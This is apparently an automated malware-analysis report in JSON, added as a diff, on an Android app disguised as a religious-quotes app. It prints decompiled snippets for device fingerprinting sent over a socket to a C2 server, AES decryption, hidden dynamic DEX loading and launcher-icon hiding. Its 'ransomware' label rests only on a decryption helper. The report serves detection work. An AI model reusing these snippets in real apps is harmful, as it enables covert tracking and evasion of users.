@@ -1,0 +1,149 @@
+{
+  "APK信息": {
+    "文件名": "3e837ebb6c370342cf6973bb999b68ece7cdd4d533862b1b2e7815dedfed42a5.apk",
+    "sha256": "3e837ebb6c370342cf6973bb999b68ece7cdd4d533862b1b2e7815dedfed42a5",
+    "包名": "com.easymakeup.religiousquotes",
+    "应用名": "Religious Quotes",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 875.5
+  },
+  "行为列表": [
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getSubscriberId",
+          "ANDROID_ID",
+          "getMacAddress"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\h;",
+          "method_signature": "run()",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "jSONObject.put(\"ai\", Settings.Secure.getString(this.a.getContentResolver(), \"android_id\"));\nSocket socket = new Socket();\nsocket.connect(new InetSocketAddress(this.b, a.b), a.d);\nPrintWriter printWriter = new PrintWriter(socket.getOutputStream(), true);\nprintWriter.println(jSONObject.toString());",
+          "malicious_code_snippet_context": "              JSONObject jSONObject = new JSONObject();\n              jSONObject.put(\"v\", a.e);\n              jSONObject.put(\"p\", this.a.getPackageName());\n>>>             jSONObject.put(\"ai\", Settings.Secure.getString(this.a.getContentResolver(), \"android_id\"));\n>>>             jSONObject.put(\"fv\", \"1\");\n>>>             Socket socket = new Socket();\n>>>             socket.connect(new InetSocketAddress(this.b, a.b), a.d);\n>>>             BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n              PrintWriter printWriter = new PrintWriter(socket.getOutputStream(), true);\n              printWriter.println(jSONObject.toString());\n              String readLine = bufferedReader.readLine();",
+          "behavior_description": "代码在Runnable.run()中构造JSON对象，通过Settings.Secure.getString()读取设备android_id，连同包名、版本号等指纹信息封装后，通过原始Socket连接到远程服务器(this.b:a.b)，使用PrintWriter将JSON数据明文发送至C2服务器，并读取服务器返回指令。类路径伪装为android.system系统包以隐蔽真实来源，属于典型的设备指纹采集与C2上报行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES",
+              "encrypt",
+              "decrypt"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\Utils;",
+          "method_signature": "a(String str, String str2)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "SecretKeySpec secretKeySpec = new SecretKeySpec(str2.getBytes(), \"AES\"); Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\"); cipher.init(2, secretKeySpec); bArr = cipher.doFinal(Base64.decode(str.getBytes(), 0)); return new String(bArr);",
+          "malicious_code_snippet_context": "      public static String a(String str, String str2) {\n          byte[] bArr = null;\n          try {\n>>>             SecretKeySpec secretKeySpec = new SecretKeySpec(str2.getBytes(), \"AES\");\n              Cipher cipher = Cipher.getInstance(\"AES/ECB/PKCS5Padding\");\n              cipher.init(2, secretKeySpec);\n              bArr = cipher.doFinal(Base64.decode(str.getBytes(), 0));",
+          "behavior_description": "该方法使用AES/ECB/PKCS5Padding算法执行解密操作（Cipher.init模式2=DECRYPT_MODE）。接收外部传入的Base64编码密文(str)和AES密钥(str2)，用密钥初始化解密器后对Base64解码数据进行解密，返回明文字符串。在勒索软件上下文中，该函数很可能用于解密硬编码的配置数据、C2服务器地址或用于文件加密的密钥等敏感信息，属于勒索软件加密基础设施的组成部分。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "dynamic_code_loading",
+      "中文名": "动态代码加载",
+      "MITRE": "T1407",
+      "置信度": "confirmed",
+      "证据": {
+        "方法引用": [
+          "Ldalvik/system/DexClassLoader;-><init>"
+        ],
+        "权限": [],
+        "字符串": [
+          "loadDex"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\support\\es\\multidex\\MultiDex;",
+          "method_signature": "while(iterator.hasNext()",
+          "malicious_behavior": "dynamic_code_loading",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "File additionalEntry = iterator.next();\nString entryPath = additionalEntry.getAbsolutePath();\nextraDexs[index] = DexFile.loadDex(entryPath, entryPath + \".dex\", 0);",
+          "malicious_code_snippet_context": "              DexFile[] extraDexs = new DexFile[extraSize];\n              ListIterator<File> iterator = additionalClassPathEntries.listIterator();\n              while (iterator.hasNext()) {\n>>>                 File additionalEntry = iterator.next();\n>>>                 String entryPath = additionalEntry.getAbsolutePath();\n>>>                 path.append(':').append(entryPath);\n                  int index = iterator.previousIndex();\n                  extraPaths[index] = entryPath;\n                  extraFiles[index] = additionalEntry;",
+          "behavior_description": "该代码位于非标准包路径 android.support.es.multidex（疑似篡改的MultiDex类），通过遍历额外的DEX文件列表，调用 DexFile.loadDex() 将外部DEX文件动态加载到当前进程的ClassLoader中，并扩展 mPaths/mFiles/mZips/mDexs 等字段数组使加载的DEX生效。数据流向为：文件系统中的额外DEX文件路径(additionalEntry.getAbsolutePath()) → 动态加载执行(DexFile.loadDex())。在已确认的恶意样本中，此机制常用于将恶意载荷拆分到二级DEX中以规避静态检测。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Landroid\\system\\b;",
+          "method_signature": "a(Context context)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, MainActivity.class), 2, 1);",
+          "malicious_code_snippet_context": "  /* loaded from: classes2.dex */\n  public class b {\n      public static void a(Context context) {\n>>>         context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) MainActivity.class), 2, 1);\n      }\n  \n      public static void a(Activity activity) {",
+          "behavior_description": "代码通过 PackageManager.setComponentEnabledSetting() 将 MainActivity 组件设置为 COMPONENT_ENABLED_STATE_DISABLED（值=2），使应用图标从启动器中隐藏。数据流向：context.getPackageManager() → setComponentEnabledSetting(component, DISABLED, DONT_KILL_APP)，这是恶意软件常用的图标隐藏手法，安装后隐蔽自身，防止用户发现和卸载。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
